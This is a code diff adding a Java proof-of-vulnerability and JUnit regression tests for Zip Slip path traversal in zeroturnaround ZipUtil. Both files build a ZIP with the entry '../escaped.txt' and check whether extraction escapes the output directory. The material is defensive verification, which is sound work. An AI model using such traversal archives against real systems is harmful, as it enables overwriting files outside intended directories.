+package security.pov;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+import org.zeroturnaround.zip.ZipUtil;
+
+/**
+ * Proof-of-Vulnerability for CWE-022 (Path Traversal / "Zip Slip") in
+ * org.zeroturnaround.zip.ZipUtil.
+ *
+ * A crafted ZIP whose entry name contains ".." traverses out of the
+ * requested output directory. ZipUtil.unpack() joins the entry name to the
+ * output directory with `new File(outputDir, name)` (ZipUtil.Unpacker.process,
+ * line ~1152) without validating that the resolved path stays inside
+ * outputDir, so the extracted file lands in the PARENT of outputDir.
+ *
+ * Exit 0  => escaped file was written outside outputDir  => VULNERABLE.
+ * Exit 1  => extraction was blocked / rejected            => PATCHED.
+ */
+public class ZipSlipPoV {
+
+  public static void main(String[] args) throws Exception {
+    File base = File.createTempFile("zipslip-pov", "");
+    base.delete();
+    base.mkdirs();
+
+    File outputDir = new File(base, "out");
+    outputDir.mkdirs();
+
+    // Target lives in the PARENT of outputDir; a safe extractor can never
+    // create it because "../escaped.txt" must not escape outputDir.
+    File escaped = new File(base, "escaped.txt");
+    if (escaped.exists()) {
+      escaped.delete();
+    }
+
+    // Build a malicious ZIP with a traversal entry name.
+    File zip = new File(base, "malicious.zip");
+    String maliciousEntry = "../escaped.txt";
+    ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip));
+    try {
+      zos.putNextEntry(new ZipEntry(maliciousEntry));
+      zos.write("owned-by-zip-slip".getBytes("UTF-8"));
+      zos.closeEntry();
+    } finally {
+      zos.close();
+    }
+
+    System.out.println("[pov] outputDir = " + outputDir.getCanonicalPath());
+    System.out.println("[pov] malicious entry = " + maliciousEntry);
+
+    boolean threw = false;
+    try {
+      // Exercise the real vulnerable project code through its public API.
+      ZipUtil.unpack(zip, outputDir);
+    } catch (Throwable t) {
+      threw = true;
+      System.out.println("[pov] unpack rejected the archive: " + t);
+    }
+
+    boolean escapedWritten = escaped.exists()
+        && escaped.getCanonicalPath().equals(new File(base, "escaped.txt").getCanonicalPath());
+
+    if (escapedWritten) {
+      System.out.println("[pov] VULNERABLE: file written outside outputDir at "
+          + escaped.getCanonicalPath());
+      System.exit(0);
+    }
+
+    System.out.println("[pov] SAFE: no file escaped outputDir (threw=" + threw + ")");
+    System.exit(1);
+  }
+}

+package org.zeroturnaround.zip;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.InputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+import org.zeroturnaround.zip.commons.FileUtils;
+
+import junit.framework.TestCase;
+
+/**
+ * Regression tests for the Zip Slip (CWE-022 path traversal) vulnerability.
+ * A malicious archive whose entry names escape the target output directory
+ * (e.g. "../escaped.txt") must not be written outside that directory.
+ */
+public class ZipSlipTest extends TestCase {
+
+  private static byte[] zipWithEntry(String entryName, byte[] content) throws Exception {
+    ByteArrayOutputStream bout = new ByteArrayOutputStream();
+    ZipOutputStream zout = new ZipOutputStream(bout);
+    ZipEntry entry = new ZipEntry(entryName);
+    zout.putNextEntry(entry);
+    zout.write(content);
+    zout.closeEntry();
+    zout.close();
+    return bout.toByteArray();
+  }
+
+  private File newTempDir() throws Exception {
+    File dir = File.createTempFile("zipslip-test", null);
+    assertTrue(dir.delete());
+    assertTrue(dir.mkdirs());
+    return dir;
+  }
+
+  public void testUnpackRejectsTraversalEntry() throws Exception {
+    File base = newTempDir();
+    try {
+      File outputDir = new File(base, "out");
+      assertTrue(outputDir.mkdirs());
+      File escaped = new File(base, "escaped.txt");
+
+      byte[] zip = zipWithEntry("../escaped.txt", "malicious".getBytes("UTF-8"));
+
+      boolean threw = false;
+      InputStream in = new ByteArrayInputStream(zip);
+      try {
+        ZipUtil.unpack(in, outputDir);
+      }
+      catch (ZipException e) {
+        threw = true;
+      }
+
+      assertFalse("File must not be written outside of the output directory", escaped.exists());
+      assertTrue("unpack should reject the traversal entry", threw);
+    }
+    finally {
+      FileUtils.deleteQuietly(base);
+    }
+  }
+
+  public void testUnpackAllowsNormalEntry() throws Exception {
+    File base = newTempDir();
+    try {
+      File outputDir = new File(base, "out");
+      assertTrue(outputDir.mkdirs());
+
+      byte[] zip = zipWithEntry("sub/legit.txt", "hello".getBytes("UTF-8"));
+
+      InputStream in = new ByteArrayInputStream(zip);
+      ZipUtil.unpack(in, outputDir);
+
+      File extracted = new File(outputDir, "sub/legit.txt");
+      assertTrue("Legitimate entry should be extracted", extracted.exists());
+    }
+    finally {
+      FileUtils.deleteQuietly(base);
+    }
+  }
+}
